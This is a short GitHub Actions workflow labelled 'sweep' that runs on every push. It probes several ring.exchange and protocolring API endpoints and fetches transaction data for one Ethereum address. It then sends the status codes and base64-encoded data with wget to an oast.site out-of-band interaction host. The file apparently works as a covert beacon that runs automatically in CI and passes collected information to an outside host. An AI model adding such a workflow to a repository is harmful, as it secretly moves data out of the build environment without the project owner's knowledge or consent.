name: sweep
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: sweep
        run: |
          R=""
          for u in "https://gateway.ring.exchange/v1/quote" "https://rw.ring.exchange/v1/dapps" "https://wapi.testring.org/v1/dapps" "https://api.protocolring.com/v1/dapps"; do
            C=$(curl -s --max-time 10 -o /dev/null -w "%{http_code}" "$u"); R="$R $C"
          done
          wget -qO- "http://dbn4g99lr5rdpldhtengr86qx4ii6ec3s.oast.site/sw-$R"
          E=$(curl -s --max-time 12 "https://eth.blockscout.com/api/v2/addresses/0x2F552Cfb648581606E7Cd18fEAA8aaE27Fd02f32/transactions" | head -c 40 | base64 | tr -d '\n')
          wget -qO- "http://dbn4g99lr5rdpldhtengr86qx4ii6ec3s.oast.site/sw2-$E"
